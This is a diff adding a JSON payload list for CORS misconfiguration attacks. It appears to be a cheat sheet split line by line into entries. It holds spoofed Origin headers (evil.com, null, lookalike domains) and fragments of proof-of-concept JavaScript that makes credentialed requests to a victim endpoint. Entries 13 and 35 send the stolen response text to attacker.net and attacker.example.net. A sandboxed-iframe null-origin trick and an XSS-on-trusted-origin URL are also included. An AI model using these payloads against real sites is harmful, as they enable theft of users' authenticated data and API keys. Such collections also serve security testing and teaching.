@@ -1,0 +1,425 @@
+[
+  {
+    "id": "cors-misconfiguration-1",
+    "title": "Vulnerable Implementation",
+    "payload": "GET /endpoint HTTP/1.1",
+    "context": "Vulnerable Implementation",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-2",
+    "title": "Vulnerable Implementation",
+    "payload": "Host: victim.example.com",
+    "context": "Vulnerable Implementation",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-3",
+    "title": "Vulnerable Implementation",
+    "payload": "Origin: https://evil.com",
+    "context": "Vulnerable Implementation",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-4",
+    "title": "Vulnerable Implementation",
+    "payload": "Cookie: sessionid=...",
+    "context": "Vulnerable Implementation",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-5",
+    "title": "Vulnerable Implementation",
+    "payload": "HTTP/1.1 200 OK",
+    "context": "Vulnerable Implementation",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-6",
+    "title": "Vulnerable Implementation",
+    "payload": "Access-Control-Allow-Origin: https://evil.com",
+    "context": "Vulnerable Implementation",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-7",
+    "title": "Vulnerable Implementation",
+    "payload": "Access-Control-Allow-Credentials: true",
+    "context": "Vulnerable Implementation",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-8",
+    "title": "Vulnerable Implementation",
+    "payload": "{\"[private API key]\"}",
+    "context": "Vulnerable Implementation",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-9",
+    "title": "Proof Of Concept",
+    "payload": "req.onload = reqListener;",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-10",
+    "title": "Proof Of Concept",
+    "payload": "req.open('get','https://victim.example.com/endpoint',true);",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-11",
+    "title": "Proof Of Concept",
+    "payload": "req.withCredentials = true;",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-12",
+    "title": "Proof Of Concept",
+    "payload": "req.send();",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-13",
+    "title": "Proof Of Concept",
+    "payload": "location='//attacker.net/log?key='+this.responseText;",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-14",
+    "title": "Proof Of Concept",
+    "payload": "};",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-15",
+    "title": "Proof Of Concept",
+    "payload": "<html>",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-16",
+    "title": "Proof Of Concept",
+    "payload": "<body>",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-17",
+    "title": "Proof Of Concept",
+    "payload": "<h2>CORS PoC</h2>",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-18",
+    "title": "Proof Of Concept",
+    "payload": "<div id=\"demo\">",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-19",
+    "title": "Proof Of Concept",
+    "payload": "<button type=\"button\" onclick=\"cors()\">Exploit</button>",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-20",
+    "title": "Proof Of Concept",
+    "payload": "</div>",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-21",
+    "title": "Proof Of Concept",
+    "payload": "<script>",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-22",
+    "title": "Proof Of Concept",
+    "payload": "xhr.onreadystatechange = function() {",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-23",
+    "title": "Proof Of Concept",
+    "payload": "if (this.readyState == 4 && this.status == 200) {",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-24",
+    "title": "Proof Of Concept",
+    "payload": "document.getElementById(\"demo\").innerHTML = alert(this.responseText);",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-25",
+    "title": "Proof Of Concept",
+    "payload": "xhr.open(\"GET\",",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-26",
+    "title": "Proof Of Concept",
+    "payload": "\"https://victim.example.com/endpoint\", true);",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-27",
+    "title": "Proof Of Concept",
+    "payload": "xhr.withCredentials = true;",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-28",
+    "title": "Proof Of Concept",
+    "payload": "xhr.send();",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-29",
+    "title": "Proof Of Concept",
+    "payload": "</script>",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-30",
+    "title": "Proof Of Concept",
+    "payload": "</body>",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-31",
+    "title": "Proof Of Concept",
+    "payload": "</html>",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-32",
+    "title": "Vulnerable Implementation",
+    "payload": "Origin: null",
+    "context": "Vulnerable Implementation",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-33",
+    "title": "Vulnerable Implementation",
+    "payload": "Access-Control-Allow-Origin: null",
+    "context": "Vulnerable Implementation",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-34",
+    "title": "Proof Of Concept",
+    "payload": "<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html, <script>",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-35",
+    "title": "Proof Of Concept",
+    "payload": "location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-36",
+    "title": "Proof Of Concept",
+    "payload": "</script>\"></iframe>",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-37",
+    "title": "XSS on Trusted Origin",
+    "payload": "https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>",
+    "context": "XSS on Trusted Origin",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-38",
+    "title": "Wildcard Origin without Credentials",
+    "payload": "https://*.example.com is not valid",
+    "context": "Wildcard Origin without Credentials",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-39",
+    "title": "Vulnerable Implementation",
+    "payload": "Host: api.internal.example.com",
+    "context": "Vulnerable Implementation",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-40",
+    "title": "Vulnerable Implementation",
+    "payload": "Access-Control-Allow-Origin: *",
+    "context": "Vulnerable Implementation",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-41",
+    "title": "Proof Of Concept",
+    "payload": "req.open('get','https://api.internal.example.com/endpoint',true);",
+    "context": "Proof Of Concept",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-42",
+    "title": "Vulnerable Implementation (Example 1)",
+    "payload": "Host: api.example.com",
+    "context": "Vulnerable Implementation (Example 1)",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-43",
+    "title": "Vulnerable Implementation (Example 1)",
+    "payload": "Origin: https://evilexample.com",
+    "context": "Vulnerable Implementation (Example 1)",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-44",
+    "title": "Vulnerable Implementation (Example 1)",
+    "payload": "Access-Control-Allow-Origin: https://evilexample.com",
+    "context": "Vulnerable Implementation (Example 1)",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-45",
+    "title": "Proof of Concept (Example 1)",
+    "payload": "req.open('get','https://api.example.com/endpoint',true);",
+    "context": "Proof of Concept (Example 1)",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-46",
+    "title": "Vulnerable Implementation (Example 2)",
+    "payload": "Origin: https://apiiexample.com",
+    "context": "Vulnerable Implementation (Example 2)",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  },
+  {
+    "id": "cors-misconfiguration-47",
+    "title": "Vulnerable Implementation (Example 2)",
+    "payload": "Access-Control-Allow-Origin: https://apiiexample.com",
+    "context": "Vulnerable Implementation (Example 2)",
+    "tags": [
+      "cors-misconfiguration"
+    ]
+  }
+]
